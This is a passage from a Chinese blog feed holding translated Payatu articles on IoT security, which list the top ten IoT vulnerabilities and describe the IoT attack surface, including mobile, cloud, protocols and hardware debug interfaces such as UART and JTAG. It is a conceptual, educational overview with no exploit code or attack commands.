<li>OWASP Mobile Top 10项目：<a href="https://www.owasp.org/index.php/OWASP_Mobile_Security_Project" target="_blank" rel="external">https://www.owasp.org/index.php/OWASP_Mobile_Security_Project</a></li>
</ol>
</li>
<li><ol start="3">
<li>OWASP物联网项目：https : //<a href="http://www.owasp.org/index.php/OWASP_Internet_of_Things_Project" target="_blank" rel="external">www.owasp.org/index.php/OWASP_Internet_of_Things_Project</a></li>
</ol>
</li>
<li>a. OWASP 物联网攻击面：https : //<a href="http://www.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab=IoT_Attack_Surface_Areas" target="_blank" rel="external">www.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab=IoT_Attack_Surface_Areas</a></li>
<li>b. OWASP 物联网十大漏洞：https ://<a href="http://www.owasp.org/index.php/Top_10_IoT_Vulnerabilities_" target="_blank" rel="external">www.owasp.org/index.php/Top_10_IoT_Vulnerabilities_</a>(2014 )</li>
</ul>
<h2 id="OWASP物联网十大漏洞">OWASP物联网十大漏洞</h2><p>OWASP 最近定义了物联网中的前 10 个漏洞。它非常全面，我建议您阅读它们并了解物联网生态系统的威胁和问题是什么。作为作业，您可以将其映射到我们在上一篇博文中定义的攻击面。OWASP IoT 十大漏洞（根据<a href="https://www.owasp.org/index.php/Top_IoT_Vulnerabilities）：" target="_blank" rel="external">https://www.owasp.org/index.php/Top_IoT_Vulnerabilities）：</a></p>
<ul>
<li>I1.不安全的 Web 界面</li>
<li>I2.身份验证/授权不足</li>
<li>I3.不安全的网络服务</li>
<li>I4.缺乏传输加密/完整性验证</li>
<li>I5.隐私问题</li>
<li>I6.不安全的云接口</li>
<li>I7.不安全的移动接口</li>
<li>I8.安全可配置性不足</li>
<li>I9.不安全的软件/固件</li>
<li>I10.物理安全性差</li>
</ul>
<p>我们不会深入研究前十名中每个项目的详细信息。可以在 OWASP 链接（上面给出）上找到详细信息。相反，我们将根据我们发现的问题或 Internet 上发布的问题的经验来优化前十名。</p>
<h2 id="Payatu物联网十大漏洞2018">Payatu物联网十大漏洞2018</h2><p><em>免责声明：请注意，我们的目标不是试图超越 OWASP 前十名，这些人做得很好。向 OWASP 团队致敬！这是一项基于我们经验的练习，更多地关注值得关注的硬件和新的物联网技术。</em></p>
<p>我们将继续维护和更新 Payatu IoT Top 10 漏洞。如果您有任何建议，请随时给我们发送电子邮件（info a..t payatu DOT com）。我们将 Web 和云合二为一，原因是并非所有传感器或物联网设备都具有 Web 界面，而云是生态系统的重要组成部分，从攻击面的角度来看，它主要是基于 Web API 的。此外，一些漏洞可能适用于多个组件，例如硬编码适用于设备和移动应用程序。<br>我们将定义对物联网安全市场和产品造成影响的 10 大物联网漏洞。我们将解释以下所有物联网漏洞，以了解基本的安全问题。</p>
<p><div align="center"><br><img src="/img/20210921payatu_iot_top_ten.png" align><br></div></p>
<ul>
<li>P1.硬编码敏感信息</li>
<li>P2.启用硬件调试端口</li>
<li>P3.不安全的固件</li>
<li>P4.不安全的数据存储</li>
<li>P5.认证不足</li>
<li>P6. 不安全的通信</li>
<li>P7. 不安全的配置</li>
<li>P8.数据输入过滤不足</li>
<li>P9. 不安全的移动接口</li>
<li>P10.不安全的云/网络界面</li>
</ul>
<h3 id="P1-_硬编码敏感信息">P1. 硬编码敏感信息</h3><p>由于开发人员在程序中对静态数据进行硬编码，因此在开发过程中对信息进行硬编码是常见的做法。但是，当敏感信息被硬编码时就会出现问题。很可能将敏感信息硬编码在固件以及移动应用程序或胖客户端中。问题是它对于产品的所有实例保持不变，可用于攻击部署在现场的任何产品实例。硬编码的敏感信息的一些示例：</p>
<ul>
<li><ol>
<li>凭证信息 - 包含设备服务、云服务的凭据信息。</li>
</ol>
</li>
<li><ol start="2">
<li>加密密钥 - 非对称加密私钥、对称加密密钥</li>
</ol>
</li>
<li><ol start="3">
<li>证书 - 客户端证书等</li>
</ol>
</li>
<li><ol start="4">
<li>API 密钥 - 私有/付费 API</li>
</ol>
</li>
<li><ol start="5">
<li>URLs – 开发、固件相关、用户相关、后端等。</li>
</ol>
</li>
<li><ol start="6">
<li>配置信息</li>
</ol>
</li>
</ul>
<h3 id="P2-_启用硬件调试端口">P2. 启用硬件调试端口</h3><p>设备硬件可能会打开调试端口以与系统交互。简单来说，它是 PCB 上的一组引脚，它们连接到微控制器/微处理器引脚，您可以使用客户端软件连接到这些引脚，通过硬件通信协议进行通信，允许您与系统进行交互。交互和特权级别取决于协议类型及其用法。例如，可能有 UART 接口的引脚输出，它可以让您访问高级软件/应用程序，即Shell、记录器输出等。您还可以使用以下协议与微控制器进行低级交互JTAG、SWD 等，这些使您可以直接控制微控制器，以便您可以测试和分析微控制器引脚值，读/写内部闪存，读/写寄存器值，调试操作系统/基础固件代码等等。如果设备上启用了这些端口/引脚，攻击者可以劫持设备和/或从设备中提取敏感信息，包括固件和数据。这些端口通常用于对生产设备中的问题进行故障排除/调试。</p>
<h3 id="P3-安全的固件">P3.安全的固件</h3><p>这里的术语“不安全”是指固件的管理方式，而不是具体的固件代码漏洞本身。固件包含设备的业务逻辑，基本是厂商专有，即 IP（知识产权）。如果攻击者可以访问明文固件，他/她可以对其进行逆向工程以发现安全问题或克隆逻辑并最终克隆产品本身。漏洞取决于固件在设备上的存储和更新方式。如果不注意正确加密存储或动态（更新）中的固件，攻击者可以获取它。固件的一些问题是（但不限于）：</p>
<ul>
<li><ol>
<li>固件以明文形式存储在内存芯片上</li>
</ol>
</li>
<li><ol start="2">
<li>固件未签名和/或引导加载程序在加载前未验证固件的完整性</li>
</ol>
</li>
<li><ol start="3">
<li>固件更新以明文形式从云或移动设备传输到设备。</li>
</ol>
</li>
<li><ol start="4">
<li>固件更新通过明文通信协议传输，例如 http。</li>
</ol>
</li>
<li><ol start="5">
<li>固件为所有设备实例使用单个对称密钥加密。</li>
</ol>
</li>
<li><ol start="6">
<li>固件加密密钥随设备更新一起传输。</li>
</ol>
</li>
</ul>
<p>正确实施的基于 PKI 的系统可以确保最佳安全性，但是大多数低功耗传感器缺乏有效实施 PKI 的计算能力。此外，如果更新是安全的，但可以使用其他漏洞从设备中提取到加密密钥，那么上面所有工作都是徒劳的。</p>
<h3 id="P4-不安全的数据存储">P4.不安全的数据存储</h3><p>这个问题在物联网终端设备和移动应用程序中都很突出。这在物联网终端设备中更为明显，可能是厂商认为逆向硬件很困难。敏感数据如果没有安全存储，攻击者可以提取和利用来破坏系统。除了安全问题，如果用户的个人数据没有得到适当的保护，它也可能对隐私产生影响。一些常见问题：</p>
<ul>
<li><ol>
<li>敏感数据以明文形式存储在内存芯片上</li>
</ol>
</li>
<li><ol start="2">
<li>敏感数据加密存储但加密密钥可访问</li>
</ol>
</li>
<li><ol start="3">
<li>自定义加密用于加密数据</li>
</ol>
</li>
<li><ol start="4">
<li>没有对修改数据的访问控制</li>
</ol>
</li>
<li><ol start="5">
<li>移动数据存储不安全应用程序（请参考P9. 不安全的移动界面）</li>
</ol>
</li>
</ul>
<h3 id="P5-认证不足">P5.认证不足</h3><p>设备可能使用不正确或没有身份验证机制，这允许攻击者完全绕过身份验证机制，如果它实施不当并向设备发送未经授权的命令。这对于关键物联网设备来说是一个严重的问题，因为网络上的任何人（TCP/IP 或无线电）都可以覆盖正常操作并控制设备。设备上发生的一些身份验证问题是（但不限于）：</p>
<ul>
<li><ol>
<li>没有客户端身份验证</li>
</ol>
</li>
<li><ol start="2">
<li>通过明文通信通道进行身份验证</li>
</ol>
</li>
<li><ol start="3">
<li>用于凭据的加密不正确</li>
</ol>
</li>
<li><ol start="4">
<li>可预测凭据</li>
</ol>
</li>
<li><ol start="5">
<li>默认凭据</li>
</ol>
</li>
</ul>
<h3 id="P6-_不安全的通信">P6. 不安全的通信</h3><p>如果攻击者能够从通信中嗅探、分析、重放和提取敏感信息，则物联网生态系统内的通信可能不安全。漏洞可能是由于使用了不安全的通信协议或协议本身的缺陷。为了简单起见，供应商可能会选择使用不安全的通信方法。由于物联网是一项不断发展的新技术，因此许多物联网协议没有定义适当的安全机制或供应商实施默认的不安全模式。问题包括（但不限于）：</p>
<ul>
<li><ol>
<li>共享敏感信息时未加密通信</li>
</ol>
</li>
<li><ol start="2">
<li>使用自定义加密</li>
</ol>
</li>
<li><ol start="3">
<li>使用自定义/专有协议</li>
</ol>
</li>
<li><ol start="4">
<li>使用不当加密</li>
</ol>
</li>
<li><ol start="5">
<li>使用协议默认（弱）安全模式</li>
</ol>
</li>
<li><ol start="6">
<li>使用有已知问题的协议</li>
</ol>
</li>
<li><ol start="7">
<li>重放问题</li>
</ol>
</li>
</ul>
<h3 id="P7-不安全的配置">P7.不安全的配置</h3><p>当设备配置不安全或设备不允许用户修改配置参数时，会出现此问题。此问题也发生在移动应用程序和云配置中。为了保持简单或快速交付产品，开发人员可能会选择使用简单但不安全的配置或禁止更改。一些明显的问题是（但不限于）：</p>
<ul>
<li><ol>
<li>使用默认的不安全配置</li>
</ol>
</li>
<li><ol start="2">
<li>禁止集成商或用户修改配置</li>
</ol>
</li>
<li><ol start="3">
<li>发布产品中不安全的低级协议和硬件配置</li>
</ol>
</li>
<li><ol start="4">
<li>不安全的加密模式和设置</li>
</ol>
</li>
<li><ol start="5">
<li>共享或存储的用户个人数据的可见性很低或没有可见性</li>
</ol>
</li>
</ul>
<h3 id="P8-_数据输入过滤不足">P8. 数据输入过滤不足</h3><p>随着物联网生态系统中实施更多物联网协议，这将成为未来的一个主要问题。例如，来自设备的遥测数据可能受到云或 IoT 网关的信任，从而导致已知和未知的安全问题，例如远程代码执行、基于 Web 的攻击（如 SQL 注入）、跨站点脚本等等。我们希望在未来优先考虑这一点。虽然成熟的实现确实过滤了传统技术的数据，但新的物联网协议实现还有待提高。</p>
<h3 id="P9-_不安全的移动界面">P9. 不安全的移动界面</h3><p>由于从安全角度来看移动技术相对于传感器技术已经成熟，因此我们将所有移动安全问题归为一类。这并不意味着它们的优先级较低，因为您可以看到一些高优先级漏洞也适用于移动设备。然而，由于技术的成熟，它已经拥有大量关于安全问题和安全实现的信息。作为 OWASP 的粉丝，我们建议从 OWASP Mobile Top 10 漏洞开始，这些漏洞将解决大多数安全问题。</p>
<h3 id="P10。不安全的云/网络界面">P10。不安全的云/网络界面</h3><p>正如“P9. 不安全的移动接口”，同样适用于云和网络。如果设备具有 Web 界面，您仍然可以通过 Web 攻击拥有该设备，但是这些安全问题已经得到很好的定义和理解。同样，我们建议从 OWASP Web Top 10 漏洞开始，以了解和缓解 Web 安全问题，以及来自 Cloud security Alliance 的云安全文档。请注意，这不是唯一可用的知识库，您应该查看互联网上可用的工具和研究论文。值得注意的是，云构成了物联网生态系统的数据存储和通信主干。如果云被攻陷，可能会导致整个物联网生态系统受到危害，包括世界各地和宇宙中所有部署的产品。</p>
<p>这就是这篇博文的全部内容。请密切关注本系列的下一篇博客。如果您有任何建议，请随时与我们联系。</p>
<p><em>原文链接：<a href="https://payatu.com/iot-security-part-3-101-iot-top-ten-vulnerabilities" target="_blank" rel="external">https://payatu.com/iot-security-part-3-101-iot-top-ten-vulnerabilities</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>如果您还没有阅读我们的 IoT 安全博客系列的第 1 部分和第 2 部分，我建议您先阅读它们，除非您已经熟悉基础知识并且只想阅读 IoT 十大漏洞。</p>
<p>说到十大漏洞，我们首先想到的是OWASP。为什么不呢，毕竟他们是定义 Web 和移动应用 10 大漏洞的先驱。我是 OWASP 的粉丝，这仅仅是因为 OWASP 社区多年来为定义应用程序安全问题、为行业提供免费教程和开源工具以减轻风险和漏洞所做的工作。您很有可能没有听说过 OWASP 或从他们的网站上阅读过内容，但是如果您没有，我强烈建议您访问他们的网站  <a href="https://www.owasp.org">https://www.owasp.org</a></p>
<p>OWASP 还启动了物联网安全计划，社区定义了物联网攻击面和物联网前 10 大漏洞，以及Web和移动设备10大漏洞。他们的方向是正确的，很快它就会成为学习物联网安全内容的绝佳场所。</p>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-2.物联网攻击面（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/21/IOT/iot-security-part-2-101-iot-attack-surface/"/>
    <id>http://www.youngroe.com/2021/09/21/IOT/iot-security-part-2-101-iot-attack-surface/</id>
    <published>2021-09-21T11:50:22.000Z</published>
    <updated>2021-11-06T08:50:55.392Z</updated>
    <content type="html"><![CDATA[<h2 id="物联网攻击面">物联网攻击面</h2><p>欢迎！我希望您已经阅读了之前的博客文章<a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分</a>，如果没有，希望你阅读它以了解物联网和物联网架构的含义。现在我们将开始进入安全领域，并尝试定义一种方法来理解和创建结构化流程来执行物联网的安全研究或渗透测试。<br>如果我们查看上一篇文章中定义的架构，现在我们可以轻松的对物联网进行拆分并尝试为每个组件单独定义攻击面，然后将它们组合起来以创建整个物联网生态系统攻击面。我称其为 IoT 生态系统而不是 IoT 产品，因为它确实是一个由不同组件相互通信并解决特定现实世界问题的生态系统。下面将继续定义物联网生态系统的攻击面，并详细讨论每个组件的攻击面。按组件的攻击面可以将物联网组件攻击面分为三个或四个（如果我们将通信作为攻击面），主要攻击面如下：</p>
<ul>
<li><ol>
<li>移动应用</li>
</ol>
</li>
<li><ol start="2">
<li>云</li>
</ol>
</li>
<li><ol start="3">
<li>通信</li>
</ol>
</li>
<li><ol start="4">
<li>物联网终端设备<div align="center"><br><img src="/img/20210921device_attack_surface-768x456.png" align><br></div>

</li>
</ol>
</li>
</ul>
<a id="more"></a>
<p>OWASP 现在也在物联网安全方面做了很多工作，他们也定义了攻击面。我希望你也去看看OWASP定义的物联网攻击面，通过了解不同的观点和想法有助于让你对物联网攻击面的学习更加全面。</p>
<p><strong>注意：</strong></p>
<ul>
<li><ol>
<li>微控制器一词以通用形式使用，表示微控制器、微处理器或 SoC（片上系统），除非另有说明。</li>
</ol>
</li>
<li><ol start="2">
<li>以下攻击面由我们定义，可能与其他定义有所不同。</li>
</ol>
</li>
</ul>
<h3 id="移动应用">移动应用</h3><p>移动应用是物联网的重要用户界面之一，用户可以通过它感知物理世界的状态。由于移动应用程序与物联网生态系统以发送命令和读取数据形式进行通信，因此它成为进入物联网生态系统的切入点之一。我们将尝试从物联网的角度列举移动设备的攻击面。</p>
<ul>
<li><ol>
<li>数据存储</li>
</ol>
</li>
<li><ol start="2">
<li>授权认证</li>
</ol>
</li>
<li><ol start="3">
<li>数据加密</li>
</ol>
</li>
<li><ol start="4">
<li>通信</li>
</ol>
</li>
<li><ol start="5">
<li>移动应用通用漏洞 – OWASP Mobile Top 10 浮现在脑海</li>
</ol>
</li>
</ul>
<h3 id="云">云</h3><p>云是物联网中非常重要的部分之一，通常来自物联网产品线所有实例的数据都汇聚在这里。这使它成为一个非常有趣的攻击点。请记住，我在上一篇文章中提到物联网不仅与硬件有关。原因是云将保存所有部署的物联网实例的数据，并有权向所有实例发送命令。通常命令是由用户发起的，但是如果受到攻击，攻击者将获得对部署在全球范围内的设备（及其数据）的控制权，这很危险。总体而言，攻击面侧重于它提供的接口，其中包括</p>
<ul>
<li><ol>
<li>数据存储</li>
</ol>
</li>
<li><ol start="2">
<li>授权认证</li>
</ol>
</li>
<li><ol start="3">
<li>数据加密</li>
</ol>
</li>
<li><ol start="4">
<li>通信</li>
</ol>
</li>
<li><ol start="5">
<li>应用接口</li>
</ol>
</li>
<li><ol start="6">
<li>通用 Web/云漏洞 – OWASP Web Top 10 浮现在脑海</li>
</ol>
</li>
</ul>
<h3 id="终端设备">终端设备</h3><p>接下来是设备，它是物联网技术的游戏规则改变者 :)。它与物理世界交互，也与虚拟世界通信。它是物理世界数据的第一站。鉴于其存储的用户的敏感数据（例如家庭数据、身体统计数据、个人信息），围绕用户隐私展开了一场全面的竞争。未来设备可能会直接通过钱包或单独的临时钱包使用用户的加密货币来购买物品、进行维修等。 攻击面如下所示</p>
<ul>
<li><ol>
<li>数据存储</li>
</ol>
</li>
<li><ol start="2">
<li>授权认证</li>
</ol>
</li>
<li><ol start="3">
<li>数据加密</li>
</ol>
</li>
<li><ol start="4">
<li>通信</li>
</ol>
</li>
<li><ol start="5">
<li>传感器接口</li>
</ol>
</li>
<li><ol start="6">
<li>外围接口</li>
</ol>
</li>
<li><ol start="7">
<li>硬件接口</li>
</ol>
</li>
<li><ol start="8">
<li>人机接口</li>
</ol>
</li>
</ul>
<h3 id="通信">通信</h3><p>尽管这不是一个有形的攻击面，因为理想情况下有形的攻击面是通信接口和负责通信的相应驱动程序、固件。然而，通信却需要单独列出来，因为物联网生态系统可以在有线和无线介质上使用的各种各样的通信协议。下面是部分通信攻击面。</p>
<ul>
<li><ol>
<li>授权认证</li>
</ol>
</li>
<li><ol start="2">
<li>数据加密</li>
</ol>
</li>
<li><ol start="3">
<li>使用非标准通信协议</li>
</ol>
</li>
<li><ol start="4">
<li>通信协议实现错误</li>
</ol>
</li>
</ul>
<p>硬件接口承载实际通信。然而，实际的通信数据/数据包是由在软件中实现的定义的。因此，在这个攻击面（通信）中，我们将只讨论协议。尽管协议中的缺陷可能实际发生在移动应用、设备或云上的协议端点的攻击，但为了清楚起见，我们将其保留为单独的攻击面。此处的列表中有太多协议标准无法提及。但是，我们将列出各种 IoT 产品中使用的一些常见协议。</p>
<h4 id="1-_Web">1. Web</h4><p>Web或技术术语 HTTP(S) 是最常用的通信协议，无处不在。我们将其单独列出来，因为 Web 上的攻击面是巨大的。然而，好消息是攻击面、漏洞和缓解技术大多已经标准化，因为它已经被研究了二十多年。网上有大量资源详细描述了攻击和保护。对于初学者来说，OWASP 在他们的 Web Top 10、测试指南和各种开源工具（<a href="http://www.owasp.org）方面做得很好" target="_blank" rel="external">www.owasp.org）方面做得很好</a></p>
<h4 id="2-_其他">2. 其他</h4><p>除了 Web 之外，还有许多协议，一些是特定领域的，一些是通用的，还有一些是出于性能原因。此处列出的协议太多，为简洁起见，我们将列出一些常见的协议标准，让您对所使用的协议种类有一个大致的了解。历史告诉我们，所有协议都会有实现缺陷、协议设计缺陷和配置缺陷。这些需要在渗透测试期间进行分析。</p>
<ul>
<li><ol>
<li>CoAP – <a href="https://en.wikipedia.org/wiki/Constrained_Application_Protocol" target="_blank" rel="external">https://en.wikipedia.org/wiki/Constrained_Application_Protocol</a></li>
</ol>
</li>
<li><ol start="2">
<li>MQTT - <a href="https://en.wikipedia.org/wiki/MQTT" target="_blank" rel="external">https://en.wikipedia.org/wiki/MQTT</a></li>
</ol>
</li>
<li><ol start="3">
<li>AMQP – <a href="https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol" target="_blank" rel="external">https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol</a></li>
</ol>
</li>
<li><ol start="4">
<li>WebSocket – <a href="https://en.wikipedia.org/wiki/WebSocket" target="_blank" rel="external">https://en.wikipedia.org/wiki/WebSocket</a></li>
</ol>
</li>
<li><ol start="5">
<li>CANbus - <a href="https://en.wikipedia.org/wiki/CAN_bus" target="_blank" rel="external">https://en.wikipedia.org/wiki/CAN_bus</a></li>
</ol>
</li>
<li><ol start="6">
<li>Modbus – <a href="https://en.wikipedia.org/wiki/Modbus" target="_blank" rel="external">https://en.wikipedia.org/wiki/Modbus</a></li>
</ol>
</li>
<li><ol start="7">
<li>Profibus – <a href="https://en.wikipedia.org/wiki/Profibus" target="_blank" rel="external">https://en.wikipedia.org/wiki/Profibus</a></li>
</ol>
</li>
<li><ol start="8">
<li>DNP3 – <a href="https://en.wikipedia.org/wiki/DNP3" target="_blank" rel="external">https://en.wikipedia.org/wiki/DNP3</a></li>
</ol>
</li>
<li><ol start="9">
<li>BACNet – <a href="https://en.wikipedia.org/wiki/BACnet" target="_blank" rel="external">https://en.wikipedia.org/wiki/BACnet</a></li>
</ol>
</li>
<li><ol start="10">
<li>HL7 – <a href="https://en.wikipedia.org/wiki/Health_Level_7" target="_blank" rel="external">https://en.wikipedia.org/wiki/Health_Level_7</a></li>
</ol>
</li>
<li><ol start="11">
<li>XMPP – <a href="https://en.wikipedia.org/wiki/XMPP" target="_blank" rel="external">https://en.wikipedia.org/wiki/XMPP</a></li>
</ol>
</li>
<li><ol start="12">
<li>UPnP – <a href="https://en.wikipedia.org/wiki/Universal_Plug_and_Play" target="_blank" rel="external">https://en.wikipedia.org/wiki/Universal_Plug_and_Play</a></li>
</ol>
</li>
<li><ol start="13">
<li>DNS</li>
</ol>
</li>
<li><ol start="14">
<li>SSH</li>
</ol>
</li>
<li><ol start="15">
<li>&lt;其他&gt;🙂</li>
</ol>
</li>
</ul>
<p>以上应该为您提供物联网生态系统攻击面的概述。现在我们对它有了一个清晰的认识，让我们为物联网终端设备定义一个详细的攻击面，以便我们知道在标准物联网渗透测试中我们究竟需要攻击什么。这也有助于物联网安全架构师为物联网产品创建威胁模型。<br>请注意，我们不会（重新）定义移动应用和云的攻击面，因为您可以在 Internet 上找到大量描述相同内容的资源。本博客系列的想法是为安全研究人员搭建一座进入物联网安全领域的桥梁，因此，我们将专注于当前较少提及和未标准化的部分。我们仍然会从我们的角度讨论与物联网生态系统相关的移动应用和云安全。</p>
<h2 id="物联网设备攻击面">物联网设备攻击面</h2><p>好的，让我们这样做:)。以下是物联网攻击面的独立和结构化定义。请注意，这是根据我们的理解，并未直接参考其他定义。</p>
<h3 id="1-_数据存储">1. 数据存储</h3><p>设备使用的存储。这可以进一步分为内部和外部、持久性和易失性。</p>
<h4 id="1-1_SD_卡">1.1 SD 卡</h4><p>SD 卡通常用于存储配置和产品数据。它们也可用于存储固件更新。这是一个非常有趣的攻击面，我们将在后面的博客文章中讨论某些可能通过 SD 卡进行的攻击。</p>
<h4 id="1-2_USB">1.2 USB</h4><p>某些产品可能使用 USB 驱动器来存储与 SD 卡中类似的数据，以及读取下载或存储在 USB 驱动器上的数据。与 SD 卡类似的攻击适用于 USB 存储设备。</p>
<h4 id="1-3_非易失性存储器">1.3 非易失性存储器</h4><p>非易失性存储器功能很多，包括读/写传感器数据、引导加载程序、固件、凭据、密钥等。在测试硬件板时，查看存储在芯片上的数据至关重要。我们还可以对存储器和微控制器之间的通信进行运行时分析，以分析在不同操作期间存储/读取的数据类型，可以通过让逻辑分析仪嗅探总线通信来实现的。您可以在触发设备上的特定操作时发现正在读取/写入的有趣数据。有以下不同类型的内存芯片：</p>
<ul>
<li><ol>
<li>只读存储器EPROM</li>
</ol>
</li>
<li><ol start="2">
<li>电可擦可编程只读存储器EEPROM</li>
</ol>
</li>
<li><ol start="3">
<li>FLASH – 由于其速度和效率而更常用</li>
</ol>
</li>
</ul>
<div align="center"><br><img src="/img/20210921i2c_serial_eeprom.png" align title="I2C 串行 EEPROM"><br></div>

<h4 id="1-4_易失性内存">1.4 易失性内存</h4><p>说到易失性存储器，我们脑海中立刻就会浮现出 RAM 这个词。它们广泛用于 PC 和嵌入式系统，并在运行时保存代码和数据。设备断电时数据丢失。一些常见的RAM类型如下</p>
<ul>
<li><ol>
<li>SRAM（Static Random Access Memory 静态随机存取存储器）——一种 RAM，用于保存芯片断电时丢失的数据。</li>
</ol>
</li>
<li><ol start="2">
<li>DRAM（Dynamic Random Access Memory 动态随机存取存储器）——数据会保留一段时间，之后数据会丢失，除非在运行时刷新。这意味着与 SRAM 相比，即使在芯片通电期间，数据的寿命也很短。芯片断电时数据也会丢失。</li>
</ol>
</li>
</ul>
<h4 id="1-5_微控制器内部存储器">1.5 微控制器内部存储器</h4><p>微控制器也有自己的内部存储器，通常用于存储代码。在调试微控制器时通常可以访问这些存储器，例如通过 JTAG 进行调试。微控制器中使用的各种存储器是：</p>
<ul>
<li><ol>
<li>SRAM</li>
</ol>
</li>
<li><ol start="2">
<li>EEPROM</li>
</ol>
</li>
<li><ol start="3">
<li>FLASH</li>
</ol>
</li>
</ul>
<h3 id="2-_硬件通讯接口">2. 硬件通讯接口</h3><p>同一块板上的不同硬件组件需要相互通信并与外界通信。所有这些通信都是使用定义明确的标准硬件通信协议完成的。从攻击者的角度来看，它通过嗅探或注入恶意数据让他们深入了解实际通信。分析下面提到的一些最常见的接口以查找安全问题。</p>
<h4 id="2-1_UART串口">2.1 UART串口</h4><p>UART (Universal Asynchronous Receiver Transmitter) 是一个硬件组件，允许两个硬件外设之间进行异步串行通信。它们可以在同一块板上（例如微控制器与电机或 LED 屏幕通信）或两个不同设备之间（例如设备微控制器与 PC 通信）。这是一个有趣的攻击面，因为它可能允许通过串行方式对设备进行读/写访问。在许多设备中，板上的 UART 端口保持打开状态，任何人都可以通过串行连接和访问以获取某种类型的控制台，即简单的 shell、自定义命令行控制台、日志输出等。一个设备通常会有一组引脚 -输出连接到微控制器 UART RX 和 TX 引脚，用于发送和接收串行数据。</p>
<div align="center"><br><img src="/img/20210921uart.jpg" align title="典型的 4 引脚 UART 接口"><br></div>

<h4 id="2-2_微控制器调试口">2.2 微控制器调试口</h4><p>微控制器可以在运行时使用连接到板上引脚输出的指定引脚进行调试。开发人员和设计人员使用这些引脚输出（端口）来调试、读/写固件和微控制器内部存储器、控制/测试微控制器引脚后期生产。考虑到它为攻击者提供的能力和访问权限，这使得调试端口成为最关键的攻击面之一。有一些用于此目的的标准接口如下：</p>
<p><strong>1. JTAG（Joint Test Action Group）：</strong> 随着微控制器和 PCB 变得越来越小，生产后很难对其进行测试。因此，为了在生产后有效地测试电路板，电子行业创建了一个同名协会，并定义了一种在生产后测试电路板的方法。它后来被改编为 IEEE 标准 1149.1。JTAG 协议定义了可用于测试和调试微控制器的标准接口和命令。JTAG 定义了四个引脚接口（和一个额外的可选引脚 TRST）：</p>
<ul>
<li><ol>
<li>TMS – 测试模式选择</li>
</ol>
</li>
<li><ol start="2">
<li>TCK——测试时钟</li>
</ol>
</li>
<li><ol start="3">
<li>TDI – 测试数据输入</li>
</ol>
</li>
<li><ol start="4">
<li>TDO – 测试数据输出</li>
</ol>
</li>
<li><ol start="5">
<li>TRST – 测试复位（可选引脚）</li>
</ol>
</li>
</ul>
<p>除了测试芯片外，调试器还使用这些引脚与微控制器上实现的 TAP（测试访问端口）进行通信。从安全角度来看，识别 JTAG 端口并与其连接允许攻击者提取固件、对逻辑进行逆向工程并在设备上写入恶意固件。在以后的文章中会详细介绍。</p>
<p><strong>2. cJTAG（Compact JTAG）：</strong> 这是IEEE 1149.7标准中定义的新JTAG协议。它不会取代 1149.1 标准，而是进一步扩展了它，并且向后兼容 JTAG。它定义了一个双引脚接口（TCK 和 TMS）和一个实现新功能的新 TAP。</p>
<p><strong>3. SWD（串行线调试）：</strong> SWD 是另一种用于调试微控制器的接口/协议。它是一个两针接口：a．SWDIO（双向）b．SWCLK (clock) 它是一个针对 ARM 处理器的特定的协议，它使用 ARM CPU 标准的双向线协议，在 ARM Debug Interface v5 中定义。SWD 的好处是它声称比 JTAG 更高效。</p>
<div align="center"><br><img src="/img/20210921jtag-768x704.jpg" align title="PCB 板上的JTAG接口"><br></div>

<p>请注意，JTAG 端口不一定像上图中那样位于一组 10 引脚排列中。</p>
<h4 id="2-3_I2C">2.3 I2C</h4><p>Inter-Integrated Circuit 是一种短距离通信协议，用于同一板上芯片之间的通信。它是由飞利浦（现在的恩智浦）发明的。它具有主从（多）架构并使用两线总线</p>
<ul>
<li><ol>
<li>SDA——串行数据</li>
</ol>
</li>
<li><ol start="2">
<li>SCL——串行时钟</li>
</ol>
</li>
</ul>
<p>I2C 的用例之一是EEPROM 芯片上连接到微控制器 I2C 引脚存储数据或代码。典型的攻击包括篡改数据、提取敏感信息、破坏数据等。我们应该分析 EEPROM 芯片上的静态数据，并通过嗅探 I2C 通信来执行运行时分析，以了解行为和安全隐患。如前所述，我们将在该系列中专门写一篇博文来理解和分析 I2C 通信。</p>
<h4 id="2-4_SPI">2.4 SPI</h4><p>Serial Peripheral Interface 也是一种短距离通信协议，用于同一板上芯片之间的通信。它是由摩托罗拉开发的。它是全双工的，采用主从架构（单主）。与 I2C 相比，它还具有更高的吞吐量。它使用四线串行总线：</p>
<ul>
<li><ol>
<li>SCLK——串行时钟。其他名称包括 SCK</li>
</ol>
</li>
<li><ol start="2">
<li>MOSI – 主出从入。其他名称包括 SIMO、SDI、DI、DIN、SI、MTSR。</li>
</ol>
</li>
<li><ol start="3">
<li>MISO – 主进从出。其他名称包括 SOMI、SDO、DO、DOUT、SO、MRST。</li>
</ol>
</li>
<li><ol start="4">
<li>SS – 从选择。其他名称包括 S̅S̅、SSEL、CS、C̅S̅、CE、nSS、/SS、SS#</li>
</ol>
</li>
</ul>
<p>它用于与各种外围设备通话。Flash 和 EEPROM 芯片也使用 SPI。测试和分析的方法类似于 I2C，只是我们有不同的总线接口。我们将在后面的博客文章中详细讨论 SPI。</p>
<h4 id="2-5_USB">2.5 USB</h4><p>该设备可以具有用于充电或通信的 USB（mini/micro等）接口。对于后者，有必要测试接口是否存在已知或未知问题。我们应该嗅探通信以进行运行时分析以及Fuzzing USB 接口以查找未知错误。</p>
<h4 id="2-6_传感器">2.6 传感器</h4><p>这是一个相当宽泛的名称，我们用来表示物理世界的接口。不一定限于感测型接口。例如，温度传感器将是一个完美的例子，但门锁也是一个没有感知任何东西但通过“锁定/解锁”动作控制物理世界的门锁。这些可以根据其操作分为三种类型：</p>
<ul>
<li><ol>
<li>监视器 Monitor：这与传感器的字面意义更密切相关，即感知或监视物理世界的任何变化。前任。温度、运动、脉搏、血压、胎压等。</li>
</ol>
</li>
<li><ol start="2">
<li>控制器 Control：这些类型的设备以某种方式控制物理世界。如锁、调度器等</li>
</ol>
</li>
<li><ol start="3">
